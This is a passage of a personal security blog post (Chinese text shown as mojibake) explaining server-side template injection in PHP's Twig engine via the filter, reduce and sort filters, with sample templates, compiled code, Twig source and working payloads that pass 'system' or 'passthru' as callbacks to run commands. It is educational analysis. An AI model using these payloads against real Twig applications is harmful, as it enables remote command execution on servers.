<h5 id="filerè¿‡æ»¤å™¨"><a href="#filerè¿‡æ»¤å™¨" class="headerlink" title="filerè¿‡æ»¤å™¨"></a>filerè¿‡æ»¤å™¨</h5><p>â€‹	è¿™ä¸ª <code>filter</code> è¿‡æ»¤å™¨ä½¿ç”¨ç®­å¤´å‡½æ•°æ¥è¿‡æ»¤åºåˆ—æˆ–æ˜ å°„ä¸­çš„å…ƒç´ ã€‚ç®­å¤´å‡½æ•°ç”¨äºæ¥æ”¶åºåˆ—æˆ–æ˜ å°„çš„å€¼ï¼Œç¤ºä¾‹æ¨¡æ¿å¦‚ä¸‹ï¼š</p>
<h6 id="filter-html-twig"><a href="#filter-html-twig" class="headerlink" title="filter .html.twig"></a><code>filter .html.twig</code></h6>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">set</span> lists = [<span class="number">34</span>, <span class="number">36</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">42</span>] <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; lists<span class="punctuation">|</span><span class="keyword">filter</span>(v =&gt; v &gt; <span class="number">38</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&#x27;, &#x27;</span>) &#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>â€‹	ä½¿ç”¨å¦‚ä¸‹PHPè„šæœ¬å¯è°ƒç”¨è¯¥Twigæ¨¡æ¿ï¼š</p>
<h6 id="filter-php"><a href="#filter-php" class="headerlink" title="filter.php"></a><code>filter.php</code></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Loader\FilesystemLoader</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/templates&#x27;</span>);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¸²æŸ“æ¨¡æ¿</span></span><br><span class="line"><span class="variable">$template</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="string">&#x27;filter .html.twig&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$template</span>-&gt;<span class="title function_ invoke__">render</span>();</span><br></pre></td></tr></table></figure>

<p>â€‹	Twigå°†ä¸Šè¿°æ¨¡æ¿ç¼–è¯‘ä¸ºå¦‚ä¸‹ç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="title function_ invoke__">array_filter</span>(<span class="variable">$context</span>[<span class="string">&quot;lists&quot;</span>], function (<span class="variable">$__value__</span>) &#123; <span class="keyword">return</span> (<span class="variable">$__value__</span> &gt; <span class="number">38</span>); &#125;)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="ç›®å½•ç»“æ„-1"><a href="#ç›®å½•ç»“æ„-1" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">your_project/</span><br><span class="line">â”œâ”€â”€ templates/</span><br><span class="line">â”‚   â””â”€â”€ filter.html.twig</span><br><span class="line">â””â”€â”€ filter.php</span><br></pre></td></tr></table></figure>

<p>â€‹	è®¿é—®åä½ å°†å¾—åˆ°å¦‚ä¸‹è¾“å‡ºï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">40, 42</span><br></pre></td></tr></table></figure>

<h6 id="åˆ©ç”¨è§£æ-1"><a href="#åˆ©ç”¨è§£æ-1" class="headerlink" title="åˆ©ç”¨è§£æ"></a>åˆ©ç”¨è§£æ</h6><p>â€‹	ç±»ä¼¼äº <code>map</code>ï¼Œæ¨¡æ¿ç¼–è¯‘çš„è¿‡ç¨‹ä¸­ä¼šè¿›å…¥ <code>twig_array_filter</code> å‡½æ•°ï¼Œè¿™ä¸ª <code>twig_array_filter</code> å‡½æ•°çš„æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_array_filter</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$arrow</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (\<span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">array_filter</span>(<span class="variable">$array</span>, <span class="variable">$arrow</span>, \ARRAY_FILTER_USE_BOTH);    <span class="comment">// $array å’Œ $arrow ç›´æ¥è¢« array_filter å‡½æ•°è°ƒç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">\CallbackFilterIterator</span>(<span class="keyword">new</span> <span class="title class_">\IteratorIterator</span>(<span class="variable">$array</span>), <span class="variable">$arrow</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>â€‹	æ ¹æ®æºç å¯å¾—ï¼Œ<code>$array</code> å’Œ <code>$arrow</code> å°†ä½œä¸ºå‚æ•°ç›´æ¥ä¼ é€’ç»™ <code>array_filter()</code> å‡½æ•°ã€‚è¯¥å‡½æ•°å¯ä»¥ä½¿ç”¨å›è°ƒå‡½æ•°è¿‡æ»¤æ•°ç»„ä¸­çš„å…ƒç´ ã€‚å¦‚æœæˆ‘ä»¬è‡ªå®šä¹‰ä¸€ä¸ªæ¶æ„çš„å›è°ƒå‡½æ•°ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä»£ç æ‰§è¡Œæˆ–å‘½ä»¤æ‰§è¡Œç­‰å®‰å…¨é—®é¢˜ã€‚</p>
<p>â€‹	array_filter() å‡½æ•°ç”¨å›è°ƒå‡½æ•°è¿‡æ»¤æ•°ç»„ä¸­çš„å€¼ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="keyword">array</span>,callbackfunction);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">å‚æ•°</th>
<th align="center">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>array</em></td>
<td align="center">å¿…éœ€ã€‚è§„å®šè¦è¿‡æ»¤çš„æ•°ç»„ã€‚</td>
</tr>
<tr>
<td align="center"><em>callbackfunction</em></td>
<td align="center">å¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„å›è°ƒå‡½æ•°ã€‚</td>
</tr>
</tbody></table>
<p>â€‹	arrayå¯ä»¥ä½œä¸º<em>callbackfunction</em>å¾—å‚æ•°æ¥æ‰§è¡Œã€‚</p>
<p>â€‹	payloadï¼š</p>

<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;[<span class="string">&quot;calc&quot;</span>]<span class="punctuation">|</span><span class="keyword">filter</span>(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;[<span class="string">&quot;calc&quot;</span>]<span class="punctuation">|</span><span class="keyword">filter</span>(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h5 id="reduce-è¿‡æ»¤å™¨"><a href="#reduce-è¿‡æ»¤å™¨" class="headerlink" title="reduce è¿‡æ»¤å™¨"></a>reduce è¿‡æ»¤å™¨</h5><p>â€‹	<code>reduce</code> è¿‡æ»¤å™¨ä½¿ç”¨ç®­å¤´å‡½æ•°è¿­ä»£åœ°å°†åºåˆ—æˆ–æ˜ å°„ä¸­çš„å¤šä¸ªå…ƒç´ ç¼©å‡ä¸ºå•ä¸ªå€¼ã€‚ç®­å¤´å‡½æ•°æ¥æ”¶ä¸Šä¸€æ¬¡è¿­ä»£çš„è¿”å›å€¼å’Œåºåˆ—æˆ–æ˜ å°„çš„å½“å‰å€¼ï¼Œç¤ºä¾‹æ¨¡æ¿åŠPHPè„šæœ¬å¦‚ä¸‹ï¼š</p>
<h6 id="reduce-html-twig"><a href="#reduce-html-twig" class="headerlink" title="reduce.html.twig"></a><code>reduce.html.twig</code></h6>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">set</span> numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; numbers<span class="punctuation">|</span><span class="keyword">reduce</span>((carry, v) =&gt; carry + v) &#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h6 id="reduce-php"><a href="#reduce-php" class="headerlink" title="reduce.php"></a><code>reduce.php</code></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Loader\FilesystemLoader</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/templates&#x27;</span>);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¸²æŸ“æ¨¡æ¿</span></span><br><span class="line"><span class="variable">$template</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="string">&#x27;reduce.html.twig&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$template</span>-&gt;<span class="title function_ invoke__">render</span>();</span><br></pre></td></tr></table></figure>

<p>â€‹	ç¼–è¯‘ç»“æœ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">twig_reduce_filter</span>(<span class="variable">$this</span>-&gt;env, <span class="variable">$context</span>[<span class="string">&quot;numbers&quot;</span>], function (<span class="variable">$carry</span>, <span class="variable">$v</span>) &#123; <span class="keyword">return</span> <span class="variable">$carry</span> + <span class="variable">$v</span>; &#125;);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="ç›®å½•ç»“æ„-2"><a href="#ç›®å½•ç»“æ„-2" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">your_project/</span><br><span class="line">â”œâ”€â”€ templates/</span><br><span class="line">â”‚   â””â”€â”€ reduce.html.twig</span><br><span class="line">â””â”€â”€ reduce.php</span><br></pre></td></tr></table></figure>

<p>â€‹	è®¿é—®åä½ å°†å¾—åˆ°å¦‚ä¸‹è¾“å‡ºï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure>

<h6 id="åˆ©ç”¨è§£æ-2"><a href="#åˆ©ç”¨è§£æ-2" class="headerlink" title="åˆ©ç”¨è§£æ"></a>åˆ©ç”¨è§£æ</h6><p>â€‹	æˆ‘ä»¬å‘ç°å’Œmapè¿‡æ»¤å™¨ä¸€æ ·ï¼ŒåŒæ ·å°†è¾“å…¥çš„å˜é‡å¼•å¯¼äº†twig_reduce_filterä¸­ï¼Œä¸‹é¢æ˜¯reduceä¸­æœ‰å…³twig_reduce_filterå‡½æ•°çš„æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_reduce_filter</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$arrow</span>, <span class="variable">$initial</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!\<span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>)) &#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="title function_ invoke__">iterator_to_array</span>(<span class="variable">$array</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">array_reduce</span>(<span class="variable">$array</span>, <span class="variable">$arrow</span>, <span class="variable">$initial</span>);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>â€‹	$array, $arrow å’Œ $initial ç›´æ¥è¢« array_reduce å‡½æ•°è°ƒç”¨<code>array_reduce</code> å‡½æ•°å¯ä»¥å‘é€æ•°ç»„ä¸­çš„å€¼åˆ°ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚å¦‚æœæˆ‘ä»¬è‡ªå®šä¹‰ä¸€ä¸ªå±é™©å‡½æ•°ï¼Œå°†é€ æˆä»£ç æ‰§è¡Œæˆ–å‘½ä»¤æ‰§è¡Œã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|<span class="title function_ invoke__">reduce</span>(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;calc&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="sort-è¿‡æ»¤å™¨"><a href="#sort-è¿‡æ»¤å™¨" class="headerlink" title="sort è¿‡æ»¤å™¨"></a>sort è¿‡æ»¤å™¨</h5><p>ä½œç”¨ï¼Œå¯¹æ•°ç»„è¿›è¡Œæ’åºï¼Œå¯ä»¥ä¼ é€’ä¸€ä¸ªç®­å¤´å‡½æ•°æ¥å¯¹æ•°ç»„è¿›è¡Œæ’åºï¼Œç¤ºä¾‹æ¨¡æ¿åŠPHPè„šæœ¬å¦‚ä¸‹ï¼š</p>
<h6 id="sort-html-twig"><a href="#sort-html-twig" class="headerlink" title="sort.html.twig"></a><code>sort.html.twig</code></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set fruits = [</span><br><span class="line">    &#123; name: <span class="string">&#x27;Apples&#x27;</span>, quantity: <span class="number">5</span> &#125;,</span><br><span class="line">    &#123; name: <span class="string">&#x27;Oranges&#x27;</span>, quantity: <span class="number">2</span> &#125;,</span><br><span class="line">    &#123; name: <span class="string">&#x27;Grapes&#x27;</span>, quantity: <span class="number">4</span> &#125;,</span><br><span class="line">] %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> fruit in fruits|<span class="title function_ invoke__">sort</span>((a, b) =&gt; a.quantity &lt;=&gt; b.quantity)|<span class="title function_ invoke__">column</span>(<span class="string">&#x27;name&#x27;</span>) %&#125;</span><br><span class="line">    &#123;&#123; fruit &#125;&#125;</span><br><span class="line">&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>

<h6 id="sort-php"><a href="#sort-php" class="headerlink" title="sort.php"></a><code>sort.php</code></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Loader\FilesystemLoader</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/templates&#x27;</span>);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¸²æŸ“æ¨¡æ¿</span></span><br><span class="line"><span class="variable">$template</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="string">&#x27;sort.html.twig&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$template</span>-&gt;<span class="title function_ invoke__">render</span>();</span><br></pre></td></tr></table></figure>

<p>â€‹	ç¼–è¯‘ç»“æœ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span>[<span class="string">&#x27;_parent&#x27;</span>] = <span class="variable">$context</span>;</span><br><span class="line"><span class="variable">$context</span>[<span class="string">&#x27;_seq&#x27;</span>] = <span class="title function_ invoke__">twig_ensure_traversable</span>(<span class="title function_ invoke__">twig_sort_filter</span>(<span class="variable">$this</span>-&gt;env, <span class="variable">$context</span>[<span class="string">&quot;fruits&quot;</span>], function (<span class="variable">$a</span>, <span class="variable">$b</span>) &#123; <span class="keyword">return</span> (<span class="variable">$a</span>[<span class="string">&quot;quantity&quot;</span>] &lt;=&gt; <span class="variable">$b</span>[<span class="string">&quot;quantity&quot;</span>]); &#125;));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$context</span>[<span class="string">&#x27;_seq&#x27;</span>] <span class="keyword">as</span> <span class="variable">$context</span>[<span class="string">&quot;_key&quot;</span>] =&gt; <span class="variable">$context</span>[<span class="string">&quot;fruit&quot;</span>]) &#123;</span><br><span class="line">    <span class="comment">// column()è¿‡æ»¤å™¨å°†è¿”å›å€¼ä¸º$nameçš„fruit[&#x27;name&#x27;]å¹¶è¾“å‡º</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">twig_escape_filter</span>(<span class="variable">$this</span>-&gt;env, <span class="title function_ invoke__">twig_get_attribute</span>(<span class="variable">$this</span>-&gt;env, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getSourceContext</span>(), <span class="variable">$context</span>[<span class="string">&quot;fruit&quot;</span>], <span class="string">&quot;name&quot;</span>, [], <span class="string">&quot;array&quot;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="number">13</span>), <span class="string">&quot;html&quot;</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="ç›®å½•ç»“æ„-3"><a href="#ç›®å½•ç»“æ„-3" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">your_project/</span><br><span class="line">â”œâ”€â”€ templates/</span><br><span class="line">â”‚   â””â”€â”€ sort.html.twig</span><br><span class="line">â””â”€â”€ sort.php</span><br></pre></td></tr></table></figure>

<h6 id="åˆ©ç”¨è§£æ-3"><a href="#åˆ©ç”¨è§£æ-3" class="headerlink" title="åˆ©ç”¨è§£æ"></a>åˆ©ç”¨è§£æ</h6><p>â€‹	æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°twig_sort_filter()è¿™ä¸ªå‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">twig_sort_filter</span>(<span class="variable">$this</span>-&gt;env, <span class="variable">$context</span>[<span class="string">&quot;fruits&quot;</span>], function (<span class="variable">$a</span>, <span class="variable">$b</span>) &#123; <span class="keyword">return</span> (<span class="variable">$a</span>[<span class="string">&quot;quantity&quot;</span>] &lt;=&gt; <span class="variable">$b</span>[<span class="string">&quot;quantity&quot;</span>]); &#125;)</span><br></pre></td></tr></table></figure>

<p>â€‹	ä¸‹é¢æ˜¯<code>sort</code>è¿‡æ»¤å™¨å…³äºtwig_sort_filter()å‡½æ•°çš„æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_sort_filter</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$arrow</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$array</span> <span class="keyword">instanceof</span> \<span class="built_in">Traversable</span>) &#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="title function_ invoke__">iterator_to_array</span>(<span class="variable">$array</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!\<span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeError</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;The sort filter only works with arrays or &quot;Traversable&quot;, got &quot;%s&quot;.&#x27;</span>, \<span class="title function_ invoke__">gettype</span>(<span class="variable">$array</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> !== <span class="variable">$arrow</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">uasort</span>(<span class="variable">$array</span>, <span class="variable">$arrow</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">asort</span>(<span class="variable">$array</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>â€‹	æ¼æ´éƒ¨åˆ†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (<span class="literal">null</span> !== <span class="variable">$arrow</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">uasort</span>(<span class="variable">$array</span>, <span class="variable">$arrow</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>â€‹	uasort() å‡½æ•°ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹æ•°ç»„ $arr ä¸­çš„å…ƒç´ æŒ‰é”®å€¼è¿›è¡Œæ’åºï¼Œåœ¨è¿™æ®µä»£ç ä¸­ï¼Œ$array, $arrowè¿™ä¸¤ä¸ªå˜é‡äº†åŒæ—¶å¯ä»¥ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹æ•°ç»„ä¸­çš„å…ƒç´ æŒ‰é”®å€¼è¿›è¡Œæ’åºï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¼ å…¥åŒ…å«å‡½æ•°å‚æ•°çš„åˆ—è¡¨ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;calc&quot;</span>, <span class="number">0</span>]|<span class="title function_ invoke__">sort</span>(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9506">æ–‡ç«  - Twig æ¨¡æ¿æ³¨å…¥ä»é›¶åˆ°ä¸€ - å…ˆçŸ¥ç¤¾åŒº</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11762">æ–‡ç«  - Twigæ¨¡æ¿å¼•æ“æ³¨å…¥ - å…ˆçŸ¥ç¤¾åŒº</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2242">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-Twig æ¨¡æ¿å¼•æ“æ³¨å…¥è¯¦è§£</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="http://hadagaga.github.io">hada</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://hadagaga.github.io/2025/03/03/PHPsstiTwig/">http://hadagaga.github.io/2025/03/03/PHPsstiTwig/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="http://hadagaga.github.io" target="_blank">hadaçš„ä¸ªäººåšå®¢</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP/">PHP</a><a class="post-meta__tags" href="/tags/SSTI/">SSTI</a><a class="post-meta__tags" href="/tags/Twig/">Twig</a></div><div class="post-share"><div class="social-share" data-image="/img/PHP-ssti-Twig/cover.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/02/18/SSRF-redis/" title="SSRF-Redisæœªæˆæƒè®¿é—®åˆ©ç”¨"><img class="cover" src="/img/banner.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">ä¸Šä¸€ç¯‡</div><div class="info-item-2">SSRF-Redisæœªæˆæƒè®¿é—®åˆ©ç”¨</div></div><div class="info-2"><div class="info-item-1">SSRFå‰è¨€â€‹	åœ¨è¿‘æœŸçš„å‡ 